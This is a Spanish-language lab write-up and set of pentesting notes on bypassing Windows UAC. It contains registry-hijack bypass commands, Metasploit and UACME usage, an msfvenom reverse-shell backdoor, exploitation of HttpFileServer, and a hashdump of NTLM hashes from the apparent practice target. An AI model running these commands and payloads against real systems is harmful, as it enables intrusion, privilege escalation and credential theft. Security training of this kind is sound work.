
# UAC Bypass

## <mark style="color:purple;">¿Qué es UAC?</mark>

**User Account Control (UAC)** es una característica de seguridad de Windows que protege el sistema evitando que aplicaciones no autorizadas realicen cambios administrativos sin el consentimiento del usuario.

<figure><img src="/files/Mzxtr99QslHehTyNdSbZ" alt=""><figcaption></figcaption></figure>

#### **Niveles de UAC**

* Siempre notificar (máxima seguridad)
* Notificar solo cuando los programas intentan hacer cambios
* Notificar sin atenuar el escritorio
* Nunca notificar (desactivado)

#### **Funcionamiento**

Cuando un programa necesita privilegios elevados, Windows muestra un diálogo de confirmación ("¿Deseas permitir que esta aplicación realice cambios en tu dispositivo?").

#### **Problema para el atacante**

Si tienes un shell como usuario administrador pero NO elevado, UAC impide ejecutar comandos que requieren privilegios administrativos completos (como SYSTEM). Necesitas un **UAC bypass**.

### UAC Bypass

Un UAC bypass es una técnica que permite a un atacante ejecutar un proceso con privilegios elevados (High Integrity Level) sin que el usuario vea o acepte el diálogo de UAC.

**Requisitos**:

* El usuario actual debe ser miembro del grupo **Administradores**.
* UAC debe estar configurado en un nivel no máximo (el nivel por defecto "Notificar solo cuando los programas intentan hacer cambios" es vulnerable a muchas técnicas).

***

## <mark style="color:purple;">Técnicas comunes de UAC Bypass</mark>

### **Método con fodhelper.exe (Windows 10)**

Explota la utilidad de configuración de idiomas que automáticamente se ejecuta con privilegios elevados.

```bash
# Desde una shell no elevada
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_DWORD /d 0 /f
fodhelper.exe
```

### **Método con sdclt.exe**

Explota la herramienta de backup de Windows.

```bash
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe /d "cmd.exe" /f
sdclt.exe
```

### **Método con eventvwr.exe**

Explota el visor de eventos.

```bash
reg add HKCU\Software\Classes\mscfile\shell\open\command /d "cmd.exe" /f
eventvwr.exe
```

### **Método con computerdefaults.exe**

```bash
reg add HKCU\Software\Classes\ms-settings\shell\open\command /d "cmd.exe" /f
reg add HKCU\Software\Classes\ms-settings\shell\open\command /v DelegateExecute /t REG_DWORD /d 0 /f
computerdefaults.exe
```

### UAC Bypass con Metasploit

Metasploit tiene múltiples módulos para bypass de UAC.

#### **Módulos disponibles**

```bash
search uac bypass
```

Módulos comunes:

* `exploit/windows/local/bypassuac`
* `exploit/windows/local/bypassuac_injection`
* `exploit/windows/local/bypassuac_fodhelper`
* `exploit/windows/local/bypassuac_comhijack`
* `exploit/windows/local/bypassuac_eventvwr`

#### **Ejemplo con bypassuac\_fodhelper**

Desde una sesión de Meterpreter con privilegios de administrador (pero no elevados):

```bash
use exploit/windows/local/bypassuac_fodhelper
set SESSION <ID>
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <tu_ip>
set LPORT 5555
run
```

#### **Ejemplo con bypassuac\_injection**

```bash
use exploit/windows/local/bypassuac_injection
set SESSION <ID>
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <tu_ip>
set LPORT 5555
set TARGET Windows\ x64
run
```

***

## <mark style="color:purple;">UAC Bypass con herramientas externas</mark>

### **UACME**

Es la herramienta en la que nos centraremos específicamente en el Lab de esta sección.

{% embed url="<https://github.com/hfiref0x/UACME>" %}

```bash
git clone https://github.com/hfiref0x/UACME
cd UACME
# Compilar en Visual Studio o usar binarios precompilados
Akagi.exe 23 cmd.exe
```

Donde:

* **Akagi64.exe**: Es la herramienta UACME
* **23**: Es el método/ID de bypass a utilizar (en este caso, método 23)
* **cmd.exe**: Es el programa que se ejecutará con privilegios elevados después del bypass

**El método 23** corresponde a un bypass que utiliza `fodhelper.exe` (Configuración de idiomas) para ejecutar cmd.exe con privilegios elevados sin mostrar el prompt de UAC

### **PowerUp (PowerShell)**

```bash
Import-Module .\PowerUp.ps1
Invoke-AllChecks
# Para bypass específico
Invoke-UACBypass -Method fodhelper -Payload "cmd.exe"
```

### **Empire/Starkiller**

```bash
usemodule privesc/bypassuac
```

### Ejemplo práctico con Metasploit

```bash
# Suponiendo que ya tienes una sesión de Meterpreter como administrador no elevado
sessions -l
sessions -i 1

# Verificar privilegios
getuid
getprivs

# Background a la sesión
bg

# Usar bypassuac
use exploit/windows/local/bypassuac_fodhelper
set SESSION 1
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.49.2
set LPORT 5555
set TARGET 2   # Windows x64
run

# En la nueva sesión elevada
getuid
getprivs
shell
whoami /groups | findstr "Integrity"  # Debería mostrar "High"
```

***

## <mark style="color:purple;">Lab: UACME</mark>

En este laboratorio, veremos cómo eludir [el UAC](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) utilizando la herramienta [UACME](https://github.com/hfiref0x/UACME) .

**UACME:**

* Elude el Control de cuentas de usuario (UAC) de Windows y obtén privilegios de administrador.
* Abusa de los ejecutables integrados de AutoElevate de Windows.
* Dispone de más de 65 métodos que el usuario puede utilizar para eludir el Control de cuentas de usuario (UAC), dependiendo de la versión del sistema operativo Windows.
* Desarrollado por <https://twitter.com/hFireF0X>
* Escrito principalmente en C, con algo de código en C++.

#### Host

Nuestro objetivo es `demo.ine.local`:

```bash
┌──(root㉿INE)-[~]
└─# cat /etc/hosts

127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
10.1.0.14       INE
127.0.0.1 AttackDefense-Kali
10.10.41.4      INE
10.2.30.43    demo.ine.local
```

#### Escaneo de puertos

Tenemos multitud de puertos abiertos en la máquina objetivo, lo normal en sistemas Windows como un Domain Controller:

```bash
┌──(root㉿INE)-[~]
└─# nmap -Pn -n -sS -sV demo.ine.local

Not shown: 990 closed tcp ports (reset)
PORT      STATE SERVICE            VERSION
80/tcp    open  http               HttpFileServer httpd 2.3
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49165/tcp open  msrpc              Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
```

Observamos que es un sistema muy antiguo: `Microsoft Windows Server 2008 R2`. Vemos que en el puerto 80 hay un servicio vulnerable `HttpFileServer httpd 2.3` con exploits conocidos.

### Explotación de HttpFileServer

```bash
msfconsole
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS demo.ine.local
set LHOST 10.10.41.4
exploit

[*] Started reverse TCP handler on 10.10.41.4:4444 
[*] Using URL: http://10.10.41.4:8080/TJrl7WNBuwD
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /TJrl7WNBuwD
[*] Sending stage (176198 bytes) to 10.2.30.43
[!] Tried to delete %TEMP%\WtETzdNx.vbs, unknown result
[*] Meterpreter session 1 opened (10.10.41.4:4444 -> 10.2.30.43:49259) at 2026-03-31 19:29:59 +0530
[*] Server stopped.

meterpreter > getuid
Server username: VICTIM\admin
```

Vemos que accedemos como el usuario admin, pero tenemos privilegios de un usuario normal:

```bash
meterpreter > getuid
Server username: VICTIM\admin

meterpreter > shell

Process 2456 created.
Channel 2 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\admin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State   
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
```

Y el comando `getsystem` falla:

```bash
meterpreter > getsystem

[-] priv_elevate_getsystem: Operation failed: 1346 The following was attempted:
[-] Named Pipe Impersonation (In Memory/Admin)
[-] Named Pipe Impersonation (Dropper/Admin)
[-] Token Duplication (In Memory/Admin)
[-] Named Pipe Impersonation (RPCSS variant)
[-] Named Pipe Impersonation (PrintSpooler variant)
[-] Named Pipe Impersonation (EFSRPC variant - AKA EfsPotato)
```

### Bypass UAC

#### MSFVenom Payload

```bash
┌──(root㉿INE)-[~]
└─# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.41.4 LPORT=5555 -f exe > 'backdoor.exe'

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
```

#### Subida del Backdoor

Lo subiremos en la siguiente ruta:

```bash
meterpreter > pwd
C:\Users\admin\AppData\Local\Temp

meterpreter > upload backdoor.exe
[*] Uploading  : /root/backdoor.exe -> backdoor.exe
[*] Uploaded 72.07 KiB of 72.07 KiB (100.0%): /root/backdoor.exe -> backdoor.exe
[*] Completed  : /root/backdoor.exe -> backdoor.exe
```

#### UACME

Tenemos el binario disponible en la siguiente ruta:

```
/root/Desktop/tools/UACME/Akagi64.exe
```

```bash
┌──(root㉿INE)-[~/Desktop/tools/UACME]
└─# ls
Akagi64.exe
```

#### Subida desde Meterpreter

```bash
meterpreter > upload /root/Desktop/tools/UACME/Akagi64.exe

[*] Uploading  : /root/Desktop/tools/UACME/Akagi64.exe -> Akagi64.exe
[*] Uploaded 194.50 KiB of 194.50 KiB (100.0%): /root/Desktop/tools/UACME/Akagi64.exe -> Akagi64.exe
[*] Completed  : /root/Desktop/tools/UACME/Akagi64.exe -> Akagi64.exe
```

#### Abrir Multi Handler

{% hint style="success" %}
Ejecutarlo con `exploit -j` nos permite interactuar de nuevo con la sesión que tenemos abierta.
{% endhint %}

```bash
meterpreter > bg
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.10.41.4
set LPORT 5555
exploit -j

[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.41.4:5555 
```

#### Ejecutar Akagi64

```bash
meterpreter > shell

C:\Users\admin\AppData\Local\Temp>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is AEDF-99BD

 Directory of C:\Users\admin\AppData\Local\Temp

03/31/2026  02:22 PM    <DIR>          .
03/31/2026  02:22 PM    <DIR>          ..
03/31/2026  02:13 PM    <DIR>          1
03/31/2026  02:22 PM           199,168 Akagi64.exe
03/31/2026  02:16 PM            73,802 backdoor.exe
               2 File(s)        272,970 bytes
               3 Dir(s)   8,271,405,056 bytes free
```

```bash
Akagi64.exe 23 C:\Users\admin\AppData\Local\Temp\backdoor.exe

C:\Users\admin\AppData\Local\Temp>
[*] Sending stage (176198 bytes) to 10.2.30.43
[*] Meterpreter session 2 opened (10.10.41.4:5555 -> 10.2.30.43:49351) at 2026-03-31 19:55:55 +0530
```

Si nos fijamos en la nueva sesión abierta nos fijamos que se sigue ejecutando cómo admin, en vez de SYSTEM, pero vamos a ver la diferencia:

```bash
msf6 exploit(multi/handler) > sessions

Active sessions
===============

  Id  Name  Type                     Information            Connection
  --  ----  ----                     -----------            ----------
  1         meterpreter x64/windows  VICTIM\admin @ VICTIM  10.10.41.4:4444 -> 10.2.30.43:49259 (10.2.30.43)
  2         meterpreter x86/windows  VICTIM\admin @ VICTIM  10.10.41.4:5555 -> 10.2.30.43:49351 (10.2.30.43)

msf6 exploit(multi/handler) > sessions 2
```

#### Enumeración de privilegios

Al listar los privilegios, vemos que tenemos muchísimos mas privilegios que en la anterior sesión, lo que nos permite por ejemplo hacer un `getsystem`:

```bash
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeBackupPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeCreatePagefilePrivilege
SeCreateSymbolicLinkPrivilege
SeDebugPrivilege
SeImpersonatePrivilege
SeIncreaseBasePriorityPrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
SeLoadDriverPrivilege
SeManageVolumePrivilege
SeProfileSingleProcessPrivilege
SeRemoteShutdownPrivilege
SeRestorePrivilege
SeSecurityPrivilege
SeShutdownPrivilege
SeSystemEnvironmentPrivilege
SeSystemProfilePrivilege
SeSystemtimePrivilege
SeTakeOwnershipPrivilege
SeTimeZonePrivilege
SeUndockPrivilege
```

#### SYSTEM / Flag

La flag de este Lab es el hash NTLM del usuario `admin`:

```bash
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

meterpreter > hashdump
admin:1012:aad3b435b51404eeaad3b435b51404ee:4d6583ed4cef81c2f2ac3c88********:::
Administrator:500:aad3b435b51404eeaad3b435b51404ee:659c8124523a634e0ba68e64********:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```
